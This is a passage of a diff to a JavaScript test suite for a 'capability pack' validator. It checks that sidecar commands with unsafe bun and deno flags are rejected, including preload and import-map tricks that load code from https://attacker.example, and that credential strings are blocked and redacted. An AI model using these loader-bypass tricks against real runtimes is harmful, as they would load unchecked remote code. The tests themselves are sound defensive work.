+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: './bunfig.toml', checksum: bunConfigWithPreloadChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithPreload }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '-c./bunfig.toml', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
+      }, { 'sidecar.mjs': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '-c./bunfig.toml', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: './bunfig.toml', checksum: bunConfigWithPreloadChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithPreload }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    const bunConfigWithQuotedPreloadKey = fromUtf8('"preload" = ["./unchecked.ts"]\n');
+    const bunConfigWithQuotedPreloadKeyChecksum = `sha256:${await sha256Hex(bunConfigWithQuotedPreloadKey)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: './bunfig.toml', checksum: bunConfigWithQuotedPreloadKeyChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithQuotedPreloadKey }),
+      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+    );
+    const bunConfigWithEscapedPreloadKey = fromUtf8('"pre\\u006coad" = ["./unchecked.ts"]\n');
+    const bunConfigWithEscapedPreloadKeyChecksum = `sha256:${await sha256Hex(bunConfigWithEscapedPreloadKey)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: './bunfig.toml', checksum: bunConfigWithEscapedPreloadKeyChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithEscapedPreloadKey }),
+      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+    );
+    const bunConfigWithCommentedArrayClose = fromUtf8('preload = [\n  # ]\n  "./unchecked.ts"\n]\n');
+    const bunConfigWithCommentedArrayCloseChecksum = `sha256:${await sha256Hex(bunConfigWithCommentedArrayClose)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: './bunfig.toml', checksum: bunConfigWithCommentedArrayCloseChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithCommentedArrayClose }),
+      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+    );
+    const bunConfigWithMultilineStringBeforePreload = fromUtf8('banner = """\n[not-a-table]\n"""\npreload = ["./unchecked.ts"]\n');
+    const bunConfigWithMultilineStringBeforePreloadChecksum = `sha256:${await sha256Hex(bunConfigWithMultilineStringBeforePreload)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: './bunfig.toml', checksum: bunConfigWithMultilineStringBeforePreloadChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithMultilineStringBeforePreload }),
+      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+    );
+    const bunConfigWithStringPreload = fromUtf8('preload = "./unchecked.ts"\n');
+    const bunConfigWithStringPreloadChecksum = `sha256:${await sha256Hex(bunConfigWithStringPreload)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: './bunfig.toml', checksum: bunConfigWithStringPreloadChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithStringPreload }),
+      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: './bunfig.toml', checksum: bunConfigWithStringPreloadChecksum },
+          { path: './unchecked.ts', checksum: bunConfigPreloadImportChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithStringPreload, './unchecked.ts': bunConfigPreloadImport }),
+      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+    );
+    const bunConfigWithPackagePreload = fromUtf8('preload = ["unchecked-package"]\n');
+    const bunConfigWithPackagePreloadChecksum = `sha256:${await sha256Hex(bunConfigWithPackagePreload)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: './bunfig.toml', checksum: bunConfigWithPackagePreloadChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithPackagePreload }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    const bunConfigWithTestOnlyPreload = fromUtf8('[test]\npreload = ["unchecked-package"]\n');
+    const bunConfigWithTestOnlyPreloadChecksum = `sha256:${await sha256Hex(bunConfigWithTestOnlyPreload)}`;
+    assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
+      adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
+      docs: [],
+      checksums: [
+        { path: 'sidecar.mjs', checksum: sidecarChecksum },
+        { path: './bunfig.toml', checksum: bunConfigWithTestOnlyPreloadChecksum },
+      ],
+    }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithTestOnlyPreload }), true);
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', '--import-map=https://attacker.example/map.json', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
+      }, { 'sidecar.mjs': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    const denoImportMap = fromUtf8(JSON.stringify({ imports: { './helper.mjs': 'https://attacker.example/helper.mjs' } }));
+    const denoImportMapChecksum = `sha256:${await sha256Hex(denoImportMap)}`;
+    const denoImportMapSidecar = fromUtf8("import './helper.mjs';\n");
+    const denoImportMapSidecarChecksum = `sha256:${await sha256Hex(denoImportMapSidecar)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', '--import-map', 'import_map.json', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: denoImportMapSidecarChecksum },
+          { path: 'import_map.json', checksum: denoImportMapChecksum },
+          { path: './helper.mjs', checksum: sidecarChecksum },
+        ],
+      }, {
+        'sidecar.mjs': denoImportMapSidecar,
+        'import_map.json': denoImportMap,
+        './helper.mjs': sidecar,
+      }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    const denoConfig = fromUtf8('{\n  // ordinary config is allowed\n  "compilerOptions": { "strict": true }\n}\n');
+    const denoConfigChecksum = `sha256:${await sha256Hex(denoConfig)}`;
+    assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
+      adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'deno.jsonc', 'sidecar.mjs'] },
+      docs: [],
+      checksums: [
+        { path: 'sidecar.mjs', checksum: sidecarChecksum },
+        { path: 'deno.jsonc', checksum: denoConfigChecksum },
+      ],
+    }, { 'sidecar.mjs': sidecar, 'deno.jsonc': denoConfig }), true);
+    const denoConfigExtendsBase = fromUtf8(JSON.stringify({ extends: './base.json' }));
+    const denoConfigExtendsBaseChecksum = `sha256:${await sha256Hex(denoConfigExtendsBase)}`;
+    const denoBaseConfig = fromUtf8(JSON.stringify({ compilerOptions: { strict: true } }));
+    const denoBaseConfigChecksum = `sha256:${await sha256Hex(denoBaseConfig)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'deno.json', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: 'deno.json', checksum: denoConfigExtendsBaseChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, 'deno.json': denoConfigExtendsBase }),
       { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
     );
     assert.equal(await assertCapabilityPackChecksums({
       ...manifest,
-      adapter: { kind: 'sidecar', command: ['bun', '--config', 'config.json', 'sidecar.mjs'] },
+      adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'deno.json', 'sidecar.mjs'] },
       docs: [],
       checksums: [
         { path: 'sidecar.mjs', checksum: sidecarChecksum },
-        { path: 'config.json', checksum: sidecarChecksum },
+        { path: 'deno.json', checksum: denoConfigExtendsBaseChecksum },
+        { path: 'base.json', checksum: denoBaseConfigChecksum },
       ],
-    }, { 'sidecar.mjs': sidecar, 'config.json': sidecar }), true);
+    }, { 'sidecar.mjs': sidecar, 'deno.json': denoConfigExtendsBase, 'base.json': denoBaseConfig }), true);
     await assert.rejects(
       () => assertCapabilityPackChecksums({
         ...manifest,
-        adapter: { kind: 'sidecar', command: ['deno', 'run', '--import-map=https://attacker.example/map.json', 'sidecar.mjs'] },
+        adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'configs/deno.json', 'sidecar.mjs'] },
         docs: [],
-        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
-      }, { 'sidecar.mjs': sidecar }),
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: 'configs/deno.json', checksum: denoConfigExtendsBaseChecksum },
+          { path: './base.json', checksum: denoBaseConfigChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, 'configs/deno.json': denoConfigExtendsBase, './base.json': denoBaseConfig }),
+      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+    );
+    const denoConfigWithImportMap = fromUtf8(JSON.stringify({ importMap: 'import_map.json' }));
+    const denoConfigWithImportMapChecksum = `sha256:${await sha256Hex(denoConfigWithImportMap)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['deno', 'run', '--config=deno.json', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: 'deno.json', checksum: denoConfigWithImportMapChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, 'deno.json': denoConfigWithImportMap }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    const denoConfigWithImports = fromUtf8(JSON.stringify({ imports: { './helper.mjs': 'https://attacker.example/helper.mjs' } }));
+    const denoConfigWithImportsChecksum = `sha256:${await sha256Hex(denoConfigWithImports)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'deno.json', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: 'deno.json', checksum: denoConfigWithImportsChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, 'deno.json': denoConfigWithImports }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    const denoConfigWithScopes = fromUtf8(JSON.stringify({ scopes: { './': { './helper.mjs': 'https://attacker.example/helper.mjs' } } }));
+    const denoConfigWithScopesChecksum = `sha256:${await sha256Hex(denoConfigWithScopes)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'deno.json', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: 'deno.json', checksum: denoConfigWithScopesChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, 'deno.json': denoConfigWithScopes }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    const denoBaseConfigWithImports = fromUtf8(JSON.stringify({ imports: { './helper.mjs': 'https://attacker.example/helper.mjs' } }));
+    const denoBaseConfigWithImportsChecksum = `sha256:${await sha256Hex(denoBaseConfigWithImports)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'deno.json', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: 'deno.json', checksum: denoConfigExtendsBaseChecksum },
+          { path: 'base.json', checksum: denoBaseConfigWithImportsChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, 'deno.json': denoConfigExtendsBase, 'base.json': denoBaseConfigWithImports }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    const denoConfigWithDuplicateExtends = fromUtf8('{"extends":"./base.json","extends":"./unsafe.json"}\n');
+    const denoConfigWithDuplicateExtendsChecksum = `sha256:${await sha256Hex(denoConfigWithDuplicateExtends)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'deno.json', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: 'deno.json', checksum: denoConfigWithDuplicateExtendsChecksum },
+          { path: 'base.json', checksum: denoBaseConfigChecksum },
+          { path: 'unsafe.json', checksum: denoBaseConfigWithImportsChecksum },
+        ],
+      }, {
+        'sidecar.mjs': sidecar,
+        'deno.json': denoConfigWithDuplicateExtends,
+        'base.json': denoBaseConfig,
+        'unsafe.json': denoBaseConfigWithImports,
+      }),
       { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     await assert.rejects(
@@ -785,6 +1543,45 @@ describe('Capability Plane v0.2 core contracts', () => {
       }, { 'sidecar.mjs': sidecar }),
       { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
     );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--env-file-if-exists=.env.local', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: '.env.local', checksum: sidecarEnvFileChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, '.env.local': sidecarEnvFile }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--cwd', 'workdir', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
+      }, { 'sidecar.mjs': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--no-config', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
+      }, { 'sidecar.mjs': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--conditions', 'prod', '--cwd', 'workdir', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
+      }, { 'sidecar.mjs': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
     assert.equal(await assertCapabilityPackChecksums({
       ...manifest,
       adapter: { kind: 'sidecar', command: ['node', '--env-file', '.env.local', 'sidecar.mjs'] },
@@ -799,7 +1596,7 @@ describe('Capability Plane v0.2 core contracts', () => {
     await assert.rejects(
       () => assertCapabilityPackChecksums({
         ...manifest,
-        adapter: { kind: 'sidecar', command: ['deno', 'run', '--cert', 'cert.pem', 'sidecar.mjs'] },
+        adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', '--cert', 'cert.pem', 'sidecar.mjs'] },
         docs: [],
         checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
       }, { 'sidecar.mjs': sidecar }),
@@ -807,7 +1604,7 @@ describe('Capability Plane v0.2 core contracts', () => {
     );
     assert.equal(await assertCapabilityPackChecksums({
       ...manifest,
-      adapter: { kind: 'sidecar', command: ['deno', 'run', '--cert', 'cert.pem', 'sidecar.mjs'] },
+      adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', '--cert', 'cert.pem', 'sidecar.mjs'] },
       docs: [],
       checksums: [
         { path: 'sidecar.mjs', checksum: sidecarChecksum },
@@ -846,6 +1643,20 @@ describe('Capability Plane v0.2 core contracts', () => {
         { path: './helper.mjs', checksum: sidecarChecksum },
       ],
     }, { 'sidecar.mjs': sidecar, './helper.mjs': sidecar }), true);
+    const extensionlessPreloadImport = fromUtf8("const fs = require('node:fs');\n");
+    const extensionlessPreloadImportChecksum = `sha256:${await sha256Hex(extensionlessPreloadImport)}`;
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['node', '--require', './helper', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: './helper', checksum: extensionlessPreloadImportChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, './helper': extensionlessPreloadImport }),
+      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+    );
     assert.equal(await assertCapabilityPackChecksums({
       ...manifest,
       adapter: { kind: 'sidecar', command: ['node', '-r./helper.mjs', 'sidecar.mjs', '-p8080'] },
@@ -989,7 +1800,7 @@ describe('Capability Plane v0.2 core contracts', () => {
     await assert.rejects(
       () => assertCapabilityPackChecksums({
         ...manifest,
-        adapter: { kind: 'sidecar', command: ['deno', 'eval', 'import("node:fs")'] },
+        adapter: { kind: 'sidecar', command: ['deno', '--no-config', 'eval', 'import("node:fs")'] },
         docs: [],
         checksums: [],
       }, {}),
@@ -998,10 +1809,31 @@ describe('Capability Plane v0.2 core contracts', () => {
     await assert.rejects(
       () => assertCapabilityPackChecksums({
         ...manifest,
-        adapter: { kind: 'sidecar', command: ['deno', 'run', 'https://example.test/sidecar.ts'] },
+        adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', 'https://example.test/sidecar.ts'] },
         docs: [],
         checksums: [],
       }, {}),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['node', '--test', '--test-reporter=evil-package', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
+      }, { 'sidecar.mjs': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['node', '--test', '--test-reporter', './reporter.mjs', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [
+          { path: 'sidecar.mjs', checksum: sidecarChecksum },
+          { path: './reporter.mjs', checksum: sidecarChecksum },
+        ],
+      }, { 'sidecar.mjs': sidecar, './reporter.mjs': sidecar }),
       { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     await assert.rejects(
@@ -1074,6 +1906,24 @@ describe('Capability Plane v0.2 core contracts', () => {
         docs: [],
         checksums: [],
       }, {}),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['deno', '--no-config', 'task', 'start', './sidecar.ts'] },
+        docs: [],
+        checksums: [{ path: './sidecar.ts', checksum: sidecarChecksum }],
+      }, { './sidecar.ts': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['deno', '--no-config', '--quiet', 'task', 'start', './sidecar.ts'] },
+        docs: [],
+        checksums: [{ path: './sidecar.ts', checksum: sidecarChecksum }],
+      }, { './sidecar.ts': sidecar }),
       { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
     );
     await assert.rejects(
@@ -1175,23 +2025,32 @@ describe('Capability Plane v0.2 core contracts', () => {
         docs: [],
         checksums: [{ path: 'sidecar.mjs', checksum: sidecarImportChecksum }],
       }, { 'sidecar.mjs': sidecarImport }),
-      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
+      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
     );
     const secretSidecar = fromUtf8('API_KEY=supersecret123\n');
     const secretSidecarChecksum = `sha256:${await sha256Hex(secretSidecar)}`;
     await assert.rejects(
       () => assertCapabilityPackChecksums({
         ...manifest,
-        adapter: { kind: 'sidecar', command: ['sidecar.sh'] },
+        adapter: { kind: 'sidecar', command: ['./sidecar.sh'] },
         docs: [],
-        checksums: [{ path: 'sidecar.sh', checksum: secretSidecarChecksum }],
-      }, { 'sidecar.sh': secretSidecar }),
+        checksums: [{ path: './sidecar.sh', checksum: secretSidecarChecksum }],
+      }, { './sidecar.sh': secretSidecar }),
       { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
     );
     assert.throws(
       () => assertCapabilityManifest({ ...manifest, extra: 'sk-raw-manifest-secret' }),
       { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
     );
+    assert.throws(
+      () => assertCapabilityManifest({ ...manifest, metadata: { 'sk-abcdefghijklmnop': true } }),
+      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
+    );
+    const credentialKeyError = captureThrown(
+      () => assertCapabilityManifest({ ...manifest, metadata: { 'Bearer persisted-token-value': true } }),
+    );
+    assert.equal(credentialKeyError.code, 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN');
+    assert.equal(credentialKeyError.message.includes('Bearer persisted-token-value'), false);
     assert.equal(assertCapabilityManifest({ ...manifest, requiredSecrets: ['API_TOKEN'] }).requiredSecrets[0].name, 'API_TOKEN');
     assert.throws(
       () => assertCapabilityManifest({
@@ -1213,6 +2072,14 @@ describe('Capability Plane v0.2 core contracts', () => {
       }),
       { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
     );
+    const conformanceKeyError = captureThrown(
+      () => assertCapabilityConformanceReceipt({
+        ...passedReceipt,
+        vectors: [{ name: 'passed-vector', status: 'passed', 'Bearer conformance-token-value': true }],
+      }),
+    );
+    assert.equal(conformanceKeyError.code, 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN');
+    assert.equal(conformanceKeyError.message.includes('Bearer conformance-token-value'), false);
     assert.throws(
       () => assertCapabilityConformanceReceipt({
         ...passedReceipt,
@@ -1619,6 +2486,13 @@ describe('Capability Plane v0.2 core contracts', () => {
     assert.equal(redactSecrets({ apiKey: 'fixture-token-value' }).apiKey, '[redacted]');
     assert.equal(redactSecrets({ message: 'sk-abcdefghijklmnop' }).message, '[redacted]');
     assert.equal(redactCapabilityDiagnostics({ diagnostics: { Authorization: 'Bearer fixture-token-value' } }).diagnostics.Authorization, '[redacted]');
+    assert.deepEqual(redactCapabilityDiagnostics({ diagnostics: { 'sk-abcdefghijklmnop': true, safe: true } }).diagnostics, { safe: true });
+    assert.deepEqual(redactCapabilityDiagnostics({ diagnostics: new Map([['Bearer fixture-token-value', true], ['safe', 'token=fixture-token-value']]) }).diagnostics, { safe: '[redacted]' });
+    const redactedPrototypeKey = redactCapabilityDiagnostics(new Map([['__proto__', { polluted: true }]]));
+    assert.equal(Object.getPrototypeOf(redactedPrototypeKey), Object.prototype);
+    assert.equal(Object.hasOwn(redactedPrototypeKey, '__proto__'), true);
+    assert.equal(redactedPrototypeKey.polluted, undefined);
+    assert.deepEqual(redactedPrototypeKey.__proto__, { polluted: true });
     assert.equal(redactCapabilityDiagnostics({ message: 'sk-abcdefghijklmnop' }).message, '[redacted]');
     assert.throws(() => assertNoSecretValuePersisted({ value: ['sk', 'local-secret'].join('-') }), { code: 'ERR_SECRET_PERSISTED' });
 
@@ -1770,6 +2644,27 @@ describe('Capability Plane v0.2 core contracts', () => {
     );
     const dry = await runCapabilityMode({ mode: 'dry-run', driver, hostRequest: request });
     assert.equal(dry.submittedToWorld, false);
+    const bestEffortDryRunDriver = bestEffortModelDriver();
+    const bestEffortDryRun = await runCapabilityMode({ mode: 'dry-run', driver: bestEffortDryRunDriver, hostRequest: request });
+    assert.equal(bestEffortDryRun.submittedToWorld, false);
+    assert.equal(bestEffortDryRun.dryRun.proposedAction.driver, 'best-effort-model');
+    assert.equal(bestEffortDryRunDriver.resolveCalled, false);
+    const fileDryRunDriver = dryRunFileProbeDriver('/dry-run-root');
+    const fileDryRun = await runCapabilityMode({ mode: 'dry-run', driver: fileDryRunDriver, hostRequest: fileRequest() });
+    assert.equal(fileDryRun.submittedToWorld, false);
+    assert.equal(fileDryRun.dryRun.proposedAction.path, 'out.txt');
+    assert.equal(fileDryRunDriver.dryRunCalled, true);
+    const deniedFileDryRunDriver = dryRunFileProbeDriver('/dry-run-root');
+    await assert.rejects(
+      () => runCapabilityMode({
+        mode: 'dry-run',
+        driver: deniedFileDryRunDriver,
+        hostRequest: fileRequest(),
+        policy: { allowedFileRoots: ['/other-root'] },
+      }),
+      { code: 'ERR_CAPABILITY_FILE_ROOT_DENIED' },
+    );
+    assert.equal(deniedFileDryRunDriver.dryRunCalled, false);
     const shadow = await runCapabilityMode({ mode: 'shadow', driver, hostRequest: request, recordedResolution: fromUtf8('recorded') });
     assert.equal(shadow.submittedToWorld, false);
     let fixtureLiveEffectResolveCalled = false;
@@ -1853,6 +2748,30 @@ describe('Capability Plane v0.2 core contracts', () => {
       },
     });
     assert.equal(assertNoWorldEvidenceKeys({ bytesWithEnumerableGetter }), true);
+    assert.throws(
+      () => assertNoWorldEvidenceKeys({ diagnostics: new Map([['turnReceiptBytes', fromUtf8('receipt')]]) }),
+      { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
+    );
+    assert.throws(
+      () => assertNoWorldEvidenceKeys({ diagnostics: new Map([['nested', { boundaryModuleBytes: fromUtf8('module') }]]) }),
+      { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
+    );
+    assert.throws(
+      () => assertNoWorldEvidenceKeys({ diagnostics: new Set([{ runHead: { generation: 1 } }]) }),
+      { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
+    );
+    const mapWithOwnEvidence = new Map();
+    mapWithOwnEvidence.turnReceiptBytes = fromUtf8('receipt');
+    assert.throws(
+      () => assertNoWorldEvidenceKeys(mapWithOwnEvidence),
+      { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
+    );
+    const setWithOwnEvidence = new Set();
+    setWithOwnEvidence.boundaryModuleBytes = fromUtf8('module');
+    assert.throws(
+      () => assertNoWorldEvidenceKeys(setWithOwnEvidence),
+      { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
+    );
 
     const approved = await runCapabilityMode({
